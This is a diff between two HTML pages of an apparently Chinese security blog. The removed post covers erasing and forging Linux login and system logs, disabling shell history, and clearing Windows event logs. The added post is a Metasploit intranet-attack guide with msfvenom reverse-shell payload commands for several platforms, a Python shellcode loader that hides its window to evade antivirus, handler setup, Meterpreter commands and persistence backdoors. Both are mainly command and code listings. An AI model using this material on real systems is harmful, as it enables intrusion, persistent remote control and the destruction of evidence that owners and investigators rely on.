@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          日志清理 - Rootclay
+          In-Net MSF - Rootclay
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.github.io/2017/08/02/日志清理/">
+    <link rel="canonical" href="http://rootclay.github.io/2017/07/25/msf/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -89,11 +89,11 @@
                               <a class="tag" href="/tags/#Web" title="Web">Web</a>
                             
                         </div>
-                        <h1>日志清理</h1>
-                        <h2 class="subheading">日志清理的个人总结.</h2>
+                        <h1>In-Net MSF</h1>
+                        <h2 class="subheading">内网代理的个人总结.</h2>
                         <span class="meta">
                             Posted by Rootclay on
-                            2017-08-02
+                            2017-07-25
                         </span>
                     </div>
                 
@@ -140,14 +140,14 @@
 
                         
                         <li>
-                            <a href="/about/">About</a>
+                            <a href="/archive/">Archives</a>
                         </li>
                         
                     
 
                         
                         <li>
-                            <a href="/archive/">Archives</a>
+                            <a href="/about/">About</a>
                         </li>
                         
                     
@@ -211,39 +211,65 @@
                 post-container">
 
                 <blockquote>
-<p>日志清理与伪造</p>
+<p>总结需要用到的msf技巧</p>
 </blockquote>
-<h2 id="linux平台">Linux平台</h2>
-<p>无w与who记录登录：<br>
-<code>ssh -T root@172.16.50.166 &quot;/bin/bash -i&quot;</code></p>
-<p>挂载一个内存目录，重启消失，用于存放临时文件。<code>mount -t ramfs ramfs /usr/tmp</code><br>
-系统本来就存在这样的目录<code>/dev/shm</code>这个文件绝对777权限</p>
-<p>复制文件时间：<code>touch -r /usr/sbin/sshd /dev/shm/yourfile;</code></p>
-<p>首先进入/etc/profile查看管理员是否自行增加了日志日志记录功能，再看~/.bashrc有无记录，有则删</p>
-<p>其他主要日志如下:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; <span class="built_in">export</span> HISTFILE=/dev/null; <span class="built_in">export</span> HISTSIZE=0; <span class="built_in">export</span> HISTFILESIZE=0 </div><div class="line"> </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/lastlog </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/telnetd </div><div class="line">shred -n 100 -z -u /var/run/utmp </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/secure </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/wtmp </div><div class="line">shred -n 100 -z -u /etc/wtmp</div><div class="line">shred -n 100 -z -u /var/run/utmp </div><div class="line">shred -n 100 -z -u /etc/utmp </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span> </div><div class="line">shred -n 100 -z -u /var/adm </div><div class="line">shred -n 100 -z -u /var/apache/<span class="built_in">log</span> </div><div class="line">shred -n 100 -z -u /var/apache/logs </div><div class="line">shred -n 100 -z -u /usr/<span class="built_in">local</span>/apache/<span class="built_in">log</span> </div><div class="line">shred -n 100 -z -u /usr/<span class="built_in">local</span>/apache/logs </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/acct </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/xferlog </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/messages </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/proftpd/xferlog.legacy </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/proftpd.access_log </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/proftpd.xferlog </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/httpd/error_log </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/httpd/access_log </div><div class="line">shred -n 100 -z -u /etc/httpd/logs/access_log </div><div class="line">shred -n 100 -z -u /etc/httpd/logs/error_log </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/news/suck.notice </div><div class="line">shred -n 100 -z -u /var/spool/tmp </div><div class="line">shred -n 100 -z -u /var/spool/errors </div><div class="line">shred -n 100 -z -u /var/spool/logs </div><div class="line">shred -n 100 -z -u /var/spool/locks </div><div class="line">shred -n 100 -z -u /usr/<span class="built_in">local</span>/www/logs/thttpd_log </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/thttpd_log </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/ncftpd/misclog.txt </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/ncftpd.errs </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/auth</div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/cron</div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/maillog</div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/yum.log</div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/messages</div></pre></td></tr></table></figure>
-<p>下面是主要清理登录日志：</p>
-<p>第一是系统secure日志：<br>
-sed -s ‘s/Your ip/you wanna replace/g’ access_log access.log security</p>
-<p>第二是一些登录文本日志和二进制日志</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">/var/run/utmp    </div><div class="line">utmp 对应w 和 who命令，记录当前在线的用户</div><div class="line"></div><div class="line">/var/<span class="built_in">log</span>/wtmp</div><div class="line">wtmp 对应last命令，记录一个用户登录与退出时间的永久记录</div><div class="line"></div><div class="line">/var/<span class="built_in">log</span>/btmp</div><div class="line">btmp对应lastb命令，纪录失败的纪录</div><div class="line"></div><div class="line">/var/<span class="built_in">log</span>/lastlog</div><div class="line">lastlog 对应lastlog命令，纪录最近几次成功登录的事件和最后一次不成功的登录</div></pre></td></tr></table></figure>
-<h3 id="删除日志">删除日志</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">1. 删除utmp记录，将自己从w或者who输出中隐藏</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> utmp --user root //删除用户为root的用户记录</div><div class="line"></div><div class="line">2. 删除历史登录记录(wtmp)，隐藏last的记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> wtmp --user root //删除用户为root的用户记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> wtmp --user root --host <span class="string">"127.0.0.1"</span> //删除用户为root且登录来源host为127.0.0.1的用户记录</div><div class="line"></div><div class="line">3. 删除btmp记录，隐藏lastb的记录，lastb为登录失败的用户记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> btmp --user root --host <span class="string">"172.16.50.156"</span> //删除用户为root且登录来源host为127.0.0.1的用户记录</div><div class="line"></div><div class="line">4. 删除lastlog记录，不能通过用户删除，只能通过host或者时间</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> lastlog --host <span class="string">"172.16.50.1"</span> //删除来源host的用户登录记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> lastlog --date <span class="string">"2017-8-2 22:46:34"</span> //删除登录时间为2017-8-2 22:46:34的用户登录记录</div></pre></td></tr></table></figure>
-<h3 id="伪造日志">伪造日志</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">1. 伪造utmp记录，将自己从w或者who输出中伪造</div><div class="line">python fake_login_log.py --mode add --<span class="built_in">type</span> utmp --user nobody --tty <span class="string">"pts/8"</span> --pid 25394 --date <span class="string">"2017-8-2 22:46:34"</span> --host <span class="string">"127.0.0.1"</span> //伪造用户为nobody的用户记录</div><div class="line">这里伪造的时间和host可以通过who命令去找到，PID一般伪造bash或者ssh通过`ps -aux | grep ssh/bash`去寻找</div><div class="line"></div><div class="line">2. 伪造历史登录记录(wtmp)，伪造last的记录</div><div class="line">python fake_login_log.py --mode add  --<span class="built_in">type</span> wtmp --user root --tty <span class="string">"pts/7"</span> --date <span class="string">"2017-8-2 00:06:34"</span> --host <span class="string">"127.0.0.1"</span></div><div class="line"></div><div class="line">3. 伪造btmp记录，伪造lastb的记录，lastb为登录失败的用户记录</div><div class="line">python fake_login_log.py --mode add  --<span class="built_in">type</span> btmp --user root --tty <span class="string">"pts/7"</span> --date <span class="string">"2017-8-2 00:06:34"</span> --host <span class="string">"127.0.0.1"</span> //伪造用户为root且登录来源host为127.0.0.1的用户登录失败记录</div><div class="line"></div><div class="line">4. 伪造lastlog记录</div><div class="line">python fake_login_log.py --mode add --<span class="built_in">type</span>=lastlog --user=rootclay --date=<span class="string">"2017-7-24 14:22:07"</span> --tty <span class="string">"pts/2"</span> --host <span class="string">"127.0.0.1"</span> //伪造用户为rootclay 时间2017-7-24 14:22:07 来源登录ip为127.0.0.1的用户登录记录</div></pre></td></tr></table></figure>
-<h2 id="windows平台">Windows平台</h2>
-<p>Windows日志包括五个类别：</p>
+<h2 id="msf内网渗透">MSF内网渗透</h2>
+<h3 id="流程">流程</h3>
 <ol>
-<li>应用程序</li>
-<li>安全</li>
-<li>Setup</li>
-<li>系统</li>
-<li>转发事件</li>
+<li>
+<p>生成Payload：</p>
+<ol>
+<li>生成Python<br>
+<code>msfvenom -p windows/meterpreter/reverse_http LPORT=443 LHOST=IP -e x86/shikata_ga_nai -i 11 -f py -o ~/clay.py</code></li>
+<li>生成Exe<br>
+<code>msfvenom -p windows/x64/meterpreter_reverse_tcp -e -i 3 LHOST=172.22.25.51 LPORT=23333 -f exe -o ~/Desktop/shell.exe</code></li>
+<li>生成java payload<br>
+<code>msfvenom -p java/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333 -o ~/Desktop/123.jar</code></li>
+<li>生成php payload<br>
+<code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.42.0.1 LPORT=23333 -o ~/Desktop/123.php</code></li>
+<li>生成Linux payload<br>
+<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333 -f elf -o ~/Desktop/123.elf</code></li>
+<li>生成Android的payload<br>
+<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333 -o ~/Desktop/1234.apk</code><br>
+生</li>
 </ol>
-<p>wevtutil清除</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wevtutil.exe cl application</div><div class="line">wevtutil.exe cl Security</div><div class="line">wevtutil.exe cl setup</div><div class="line">wevtutil.exe cl system</div><div class="line">wevtutil.exe cl forwardedevents</div></pre></td></tr></table></figure>
-<p>直接绕过日志：<br>
-<a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="external">Invoke-Phant0m</a></p>
+</li>
+<li>
+<p>免杀Payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> ctypes</div><div class="line"></div><div class="line">/*</div><div class="line">code</div><div class="line">*/</div><div class="line"></div><div class="line"><span class="comment">#libc = CDLL('libc.so.6')</span></div><div class="line">PROT_READ = <span class="number">1</span></div><div class="line">PROT_WRITE = <span class="number">2</span></div><div class="line">PROT_EXEC = <span class="number">4</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">executable_code</span><span class="params">(buffer)</span>:</span></div><div class="line">    buf = c_char_p(buffer)</div><div class="line">    size = len(buffer)</div><div class="line">    addr = libc.valloc(size)</div><div class="line">    addr = c_void_p(addr)</div><div class="line">    <span class="keyword">if</span> <span class="number">0</span> == addr:  </div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to allocate memory"</span>)</div><div class="line">    memmove(addr, buf, size)</div><div class="line">    <span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to set protection on buffer"</span>)</div><div class="line">    <span class="keyword">return</span> addr</div><div class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</div><div class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</div><div class="line">shellcode = bytearray(buf)</div><div class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()    </div><div class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</div><div class="line">	<span class="keyword">if</span> <span class="number">666</span>==<span class="number">666</span>:</div><div class="line">		ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)    </div><div class="line">		ctypes.windll.kernel32.CloseHandle(whnd)</div><div class="line"><span class="keyword">print</span> <span class="string">".................................."</span>*<span class="number">666</span></div><div class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</div><div class="line">                                          ctypes.c_int(len(shellcode)),</div><div class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</div><div class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</div><div class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</div><div class="line">old = ctypes.c_long(<span class="number">1</span>)</div><div class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</div><div class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</div><div class="line">                                     buf,</div><div class="line">                                     ctypes.c_int(len(shellcode)))</div><div class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</div><div class="line"><span class="keyword">print</span> <span class="string">"Code By Root"</span></div><div class="line">shell()</div></pre></td></tr></table></figure>
+<p><code>python PyInstaller.py --console --onefile clay.py</code></p>
+</li>
+<li>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</div><div class="line"><span class="built_in">set</span> LPORT 443</div><div class="line"><span class="built_in">set</span> LHOST 0.0.0.0</div><div class="line">exploit</div><div class="line"></div><div class="line">msfconsole -r <span class="built_in">command</span></div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="meterpreter的常用命令">Meterpreter的常用命令</h3>
+<ol>
+<li>
+<p>基本命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">background <span class="comment"># 让meterpreter处于后台模式</span></div><div class="line"></div><div class="line">sessions -i index <span class="comment"># 与会话进行交互，index表示第一个session</span></div><div class="line"></div><div class="line">quit <span class="comment"># 退出会话</span></div><div class="line"></div><div class="line">shell <span class="comment"># 获得控制台权限</span></div><div class="line"></div><div class="line">irb <span class="comment"># 开启ruby终端</span></div></pre></td></tr></table></figure>
+</li>
+<li>
+<p>文件系统命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">cat <span class="comment"># 查看文件内容</span></div><div class="line"></div><div class="line">getwd <span class="comment"># 查看当前工作目录</span></div><div class="line"></div><div class="line">upload <span class="comment"># 上传文件到目标机上</span></div><div class="line"></div><div class="line">download <span class="comment"># 下载文件到本机上</span></div><div class="line"></div><div class="line">edit <span class="comment"># 编辑文件</span></div><div class="line"></div><div class="line">search <span class="comment"># 搜索文件</span></div></pre></td></tr></table></figure>
+</li>
+<li>
+<p>网络命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ipconfig / ifconfig <span class="comment"># 查看网络接口信息</span></div><div class="line"></div><div class="line">portfwd add -l 4444 -p 3389 -r 192.168.1.102 <span class="comment"># 端口转发，本机监听4444，把目标机3389转到本机4444</span></div><div class="line"></div><div class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 <span class="comment">#然后使用rdesktop来连接，-u 用户名 -p 密码</span></div><div class="line"></div><div class="line">route <span class="comment"># 获取路由表信息</span></div></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="3">
+<li>
+<p>系统命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">ps <span class="comment"># 查看当前活跃进程</span></div><div class="line"></div><div class="line">migrate pid <span class="comment"># 将Meterpreter会话移植到进程数位pid的进程中</span></div><div class="line"></div><div class="line">execute -H -i -f cmd.exe <span class="comment"># 创建新进程cmd.exe，-H不可见，-i交互</span></div><div class="line"></div><div class="line">getpid <span class="comment"># 获取当前进程的pid</span></div><div class="line"></div><div class="line"><span class="built_in">kill</span> pid <span class="comment"># 杀死进程</span></div><div class="line"></div><div class="line">getuid <span class="comment"># 查看权限</span></div><div class="line"></div><div class="line">sysinfo <span class="comment"># 查看目标机系统信息，如机器名，操作系统等</span></div><div class="line"></div><div class="line">shutdown <span class="comment"># 关机</span></div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="植入后门">植入后门</h3>
+<h4 id="persistence">persistence</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Meterpreter &gt; run persistence -X -i 5 -p 443 -r ip</div><div class="line">-X 开机启动 -i 连接间隔</div></pre></td></tr></table></figure>
+<h4 id="metsvc">metsvc</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Meterpreter  &gt; run metsvc</div></pre></td></tr></table></figure>
 
                 
 
@@ -251,9 +277,13 @@ sed -s ‘s/Your ip/you wanna replace/g’ access_log access.log security</p>
                 <!-- Pager -->
                 <ul class="pager">
                     
+                        <li class="previous">
+                            <a href="/2017/08/01/SSH如何稳定方向代理/" data-toggle="tooltip" data-placement="top" title="SSH如何反向代理稳定穿透内网">&larr; Previous Post</a>
+                        </li>
+                    
                     
                         <li class="next">
-                            <a href="/2017/08/01/SSH如何稳定方向代理/" data-toggle="tooltip" data-placement="top" title="SSH如何反向代理稳定穿透内网">Next Post &rarr;</a>
+                            <a href="/2017/07/25/Innet_proxy/" data-toggle="tooltip" data-placement="top" title="内网代理">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -283,7 +313,7 @@ sed -s ‘s/Your ip/you wanna replace/g’ access_log access.log security</p>
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#linux平台"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Linux平台</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#删除日志"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">删除日志</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#伪造日志"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">伪造日志</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#windows平台"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">Windows平台</span></a></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#msf内网渗透"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MSF内网渗透</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#流程"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">流程</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#meterpreter的常用命令"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Meterpreter的常用命令</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#植入后门"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">植入后门</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#persistence"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">persistence</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#metsvc"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">metsvc</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
@@ -350,8 +380,8 @@ sed -s ‘s/Your ip/you wanna replace/g’ access_log access.log security</p>
 <script type="text/javascript">
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = "your-disqus-ID";
-    var disqus_identifier = "http://rootclay.github.io/2017/08/02/日志清理/";
-    var disqus_url = "http://rootclay.github.io/2017/08/02/日志清理/";
+    var disqus_identifier = "http://rootclay.github.io/2017/07/25/msf/";
+    var disqus_url = "http://rootclay.github.io/2017/07/25/msf/";
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
